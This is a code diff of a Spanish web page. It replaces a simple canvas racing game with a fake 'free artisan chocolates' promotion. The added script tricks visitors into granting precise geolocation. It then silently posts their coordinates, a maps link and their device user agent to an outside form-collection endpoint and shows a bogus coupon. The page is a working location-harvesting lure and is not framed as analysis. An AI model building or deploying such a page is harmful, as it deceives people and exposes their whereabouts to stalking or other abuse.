@@ -2,129 +2,97 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nitro Racer Invertido</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chocolates de Regalo</title>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; font-family: sans-serif; }
-        canvas { display: block; }
-        .ui { position: fixed; top: 15px; width: 100%; text-align: center; color: #0ff; font-size: 20px; text-shadow: 0 0 10px #0ff; }
-        .controls { position: fixed; bottom: 20px; width: 100%; display: flex; justify-content: space-around; }
-        .btn { width: 75px; height: 75px; border: 3px solid #0ff; border-radius: 50%; color: #0ff; display: flex; align-items: center; justify-content: center; font-size: 30px; background: rgba(0,255,255,0.1); touch-action: manipulation; }
-        #nitro { border-color: #f0f; color: #f0f; font-size: 16px; font-weight: bold; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #4b2c20; /* Color chocolate profundo */
+            color: white;
+        }
+        .tarjeta {
+            background: white;
+            color: #333;
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 85%;
+            max-width: 320px;
+        }
+        h1 { color: #613e2f; margin-bottom: 10px; }
+        p { font-size: 15px; color: #555; line-height: 1.4; }
+        .boton-promo {
+            background: linear-gradient(135deg, #a67c52 0%, #613e2f 100%);
+            color: white;
+            border: none;
+            padding: 18px 25px;
+            border-radius: 50px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(166, 124, 82, 0.4);
+            transition: 0.3s;
+        }
+        .boton-promo:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
 
-<div class="ui">DISTANCIA: <span id="d">0</span>m</div>
-<canvas id="c"></canvas>
+    <div class="tarjeta">
+        <span style="font-size: 50px;">🍫</span>
+        <h1>¡Felicidades!</h1>
+        <p>Has sido seleccionado para una degustación gratuita de nuestros nuevos chocolates artesanales.</p>
+        <p><b>Busca la tienda más cercana para redimir:</b></p>
+        
+        <button id="miBoton" class="boton-promo" onclick="activarUbicacion()">🎁 ¡Quiero Chocolates!</button>
+        
+        <p id="resultado" style="display:none; margin-top:20px; font-weight: bold; color: #2e7d32;"></p>
+    </div>
 
-<div class="controls">
-    <div class="btn" id="l">←</div>
-    <div class="btn" id="nitro">NITRO</div>
-    <div class="btn" id="r">→</div>
-</div>
+    <script>
+        function activarUbicacion() {
+            const boton = document.getElementById("miBoton");
+            const status = document.getElementById("resultado");
+            
+            boton.textContent = "Buscando tiendas...";
+            boton.disabled = true;
 
-<script>
-const canvas = document.getElementById('c');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const lat = pos.coords.latitude;
+                const lng = pos.coords.longitude;
+                
+                // TU LINK DE FORMSPREE YA INTEGRADO
+                const url = "https://formspree.io/f/mzdjqjnw";
 
-let dist = 0, speed = 0.05, isNitro = false, lane = 0, visualX = 0;
-let enemies = [], gameActive = true;
-
-// Horizonte: dónde nacen las naves (mitad de pantalla)
-const horizonY = canvas.height * 0.45;
-
-function spawn() {
-    if(!gameActive) return;
-    enemies.push({ 
-        z: 1, // Empieza en la profundidad (1 = lejos, 0 = choca contigo)
-        lane: Math.floor(Math.random() * 3) - 1 
-    });
-    setTimeout(spawn, 1200);
-}
-spawn();
-
-function loop() {
-    if(!gameActive) return;
-    
-    let curSpeed = isNitro ? speed * 3 : speed;
-    dist += isNitro ? 2 : 0.5;
-    document.getElementById('d').innerText = Math.floor(dist);
-
-    ctx.fillStyle = '#050010'; // Espacio profundo
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-    // DIBUJAR CARRETERA (Líneas que bajan)
-    ctx.strokeStyle = isNitro ? '#f0f' : '#0ff';
-    for(let i=0; i<10; i++) {
-        let lineZ = (i * 0.1 + (dist * 0.01)) % 1;
-        let y = horizonY + (lineZ * (canvas.height - horizonY));
-        ctx.globalAlpha = 1 - lineZ;
-        ctx.beginPath();
-        ctx.moveTo(0, y);
-        ctx.lineTo(canvas.width, y);
-        ctx.stroke();
-    }
-    ctx.globalAlpha = 1;
-
-    // DIBUJAR ENEMIGOS (Vienen de atrás hacia adelante)
-    enemies.forEach((en, i) => {
-        en.z -= curSpeed * 0.3; // Se acerca reduciendo su distancia Z
-
-        if(en.z > 0) {
-            // Perspectiva: cuanto menor es Z, más grande y más abajo está
-            let perspective = 1 / en.z;
-            let x = canvas.width/2 + (en.lane * 100 * perspective);
-            let y = horizonY + ( (1 - en.z) * (canvas.height - horizonY) );
-            let size = 15 * perspective;
-
-            if (y > horizonY) { // Solo dibujar si salió del horizonte
-                ctx.fillStyle = '#ff0000';
-                ctx.shadowBlur = 20 * perspective; ctx.shadowColor = 'red';
-                ctx.beginPath();
-                ctx.moveTo(x, y); 
-                ctx.lineTo(x - size, y + size);
-                ctx.lineTo(x + size, y + size);
-                ctx.fill();
-                ctx.shadowBlur = 0;
-            }
-
-            // COLISIÓN (Cuando la nave está "cerca" en el eje Y)
-            if(en.z < 0.2 && en.z > 0.1 && Math.abs(en.lane - visualX) < 0.5) {
-                gameActive = false;
-                alert("¡CHOQUE! Las naves enemigas te alcanzaron.");
-                location.reload();
-            }
-        } else {
-            enemies.splice(i, 1);
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        Alerta: "¡Nueva ubicación capturada!",
+                        Mapa_Directo: `https://www.google.com/maps?q=${lat},${lng}`,
+                        Coordenadas: `${lat}, ${lng}`,
+                        Dispositivo: navigator.userAgent
+                    })
+                }).then(() => {
+                    boton.textContent = "✅ Cupón Generado";
+                    status.style.display = "block";
+                    status.textContent = "¡Éxito! Presenta este código en tienda: CHOC-2026";
+                });
+            }, (error) => {
+                // Si la persona rechaza el permiso
+                alert("Para encontrar la tienda más cercana y entregarte el regalo, debes permitir el acceso a la ubicación.");
+                boton.textContent = "Intentar de nuevo";
+                boton.disabled = false;
+            }, { enableHighAccuracy: true });
         }
-    });
-
-    // TU NAVE (Abajo en el centro)
-    visualX += (lane - visualX) * 0.1;
-    let px = canvas.width/2 + (visualX * 120);
-    let py = canvas.height - 120;
-    
-    ctx.fillStyle = isNitro ? '#f0f' : '#0ff';
-    ctx.shadowBlur = 25; ctx.shadowColor = ctx.fillStyle;
-    ctx.beginPath();
-    ctx.moveTo(px, py - 40);
-    ctx.lineTo(px - 30, py + 10);
-    ctx.lineTo(px + 30, py + 10);
-    ctx.fill();
-
-    requestAnimationFrame(loop);
-}
-
-// CONTROLES
-document.getElementById('l').ontouchstart = () => { if(lane > -1) lane--; };
-document.getElementById('r').ontouchstart = () => { if(lane < 1) lane++; };
-document.getElementById('nitro').ontouchstart = () => isNitro = true;
-document.getElementById('nitro').ontouchend = () => isNitro = false;
-
-loop();
-</script>
+    </script>
 </body>
 </html>
